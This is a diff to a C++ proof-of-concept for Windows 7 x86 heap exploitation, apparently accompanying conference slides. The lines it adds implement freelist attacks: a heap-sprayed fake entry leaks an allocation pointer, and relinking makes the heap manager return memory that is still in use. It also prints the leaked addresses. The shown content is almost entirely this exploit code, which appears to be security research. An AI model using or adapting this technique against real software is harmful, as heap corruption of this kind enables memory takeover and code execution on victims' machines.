@@ -39,10 +39,53 @@ int _tmain(int argc, _TCHAR* argv[])
 	memcpy(target_on_heap, target, sizeof(target));
 
 #if defined(WIN7) || defined(WIN8)
-
-#ifdef WIN8
 /*
 /*/
+	if (heap.FreelistFreeToOwnAttack(HEAP_FREELIST_WIN7X86_N))
+	{
+		HEAP_ENTRY* spray_entry = (HEAP_ENTRY*)SPRAY_ADDR;
+		
+		//We need to read this address, from our heapsprayed buffer!!
+		LIST_ENTRY* leak_alloc = spray_entry->Links.Flink;
+
+		//I. memory leak
+		printf("owned allocation : %x vs %x\n", (ULONG_PTR)leak_alloc, (ULONG_PTR)(spray_entry + 1)->Links.Blink);
+
+		for (int i = 0; i < 0x10; i++)
+		{
+			size_t size = HEAP_FREELIST_WIN7X86_N - (i / 4 ) * 0x10;
+			void* big_chunk = heap.Alloc(size);
+			ULONG code1 = ((HEAP_ENTRY*)((ULONG_PTR)big_chunk - offsetof(HEAP_ENTRY, Links)))->Code1;
+
+			printf("%x (code1 : %x) size = %x\n", (ULONG_PTR)big_chunk, code1, size);
+
+			//each alloc, leak_alloc chunk will be unlinked
+			//we need to RW access to our heapsprayed buffer, to link this chunk back! :)
+
+			//II. relink ==> heap manager return already used memory! -> not freed!!!
+			spray_entry->Links.Flink = leak_alloc;
+			(spray_entry + 1)->Links.Blink = leak_alloc;
+		}
+	}
+
+/*/
+#ifdef WIN32
+	//x86 technique - mistake in my slides .. it is not fixed! .. just needs more tries to success :P 
+	//but random succes -> maybe further investigation why ...
+	if (heap.FreelistSearchToOwnHeapAttack(HEAP_FREELIST_WIN7X86_N))
+	{
+		void* big_chunk = heap.Alloc(HEAP_FREELIST_WIN7X86_N);
+		ULONG code1 = ((HEAP_ENTRY*)((ULONG_PTR)big_chunk - offsetof(HEAP_ENTRY, Links)))->Code1;
+
+		printf("HEAP ALLOC returner : %x (code1 : %x)\n", (ULONG_PTR)big_chunk, code1, ((HEAP_ENTRY*)((ULONG_PTR)big_chunk - offsetof(HEAP_ENTRY, Links)))->Links.Flink, ((HEAP_ENTRY*)((ULONG_PTR)big_chunk - offsetof(HEAP_ENTRY, Links)))->Links.Blink);
+	}
+
+	//printf("\r\n%x (%x) size = %x", (ULONG_PTR)big_chunk, *(ULONG_PTR*)((ULONG_PTR)big_chunk - sizeof(ULONG_PTR) * 2), HEAP_FREELIST_WIN7X86_N - (i / 4) * 0x10);
+#endif
+//*/
+#ifdef WIN8
+/*
+/*
 	srand ( (unsigned int)time((time_t)NULL) );
 	BYTE n = (rand() % (0x6f)) + 0x10;//0x2D;//0x24;//0x24;//0x24;//
 
@@ -63,7 +106,7 @@ int _tmain(int argc, _TCHAR* argv[])
 	{
 		printf(" .. vtable too far!\n");
 	}}
-/*/
+/*
 	srand ( (unsigned int)time((time_t)NULL) );
 	BYTE n = (rand() % (ARRAY_SIZE - 4)) + 3;
 
